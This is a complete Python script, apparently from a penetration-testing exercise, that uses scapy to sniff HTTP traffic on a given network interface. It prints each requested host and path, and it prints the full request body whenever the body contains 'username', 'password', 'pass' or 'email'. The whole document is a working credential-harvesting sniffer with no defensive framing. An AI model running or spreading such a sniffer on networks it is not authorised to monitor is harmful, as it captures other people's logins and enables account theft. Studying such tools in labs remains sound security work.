import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Specify interface on which to sniff packets')
    arguments = parser.parse_args()
    if not arguments.interface:
        print("[-] Please specify an interface using -i or --interface.")
        exit()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Decode bytes to strings
        host = packet[http.HTTPRequest].Host.decode('utf-8', errors='ignore')
        path = packet[http.HTTPRequest].Path.decode('utf-8', errors='ignore')
        print(f'[+] HTTP Request >> {host}{path}')
        
        if packet.haslayer(scapy.Raw):
            # Decode the raw load
            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            keys = ['username', 'password', 'pass', 'email']
            for key in keys:
                if key in load:
                    print(f'[+] Possible sensitive data >> {load}')
                    break

iface = get_interface()
sniff(iface)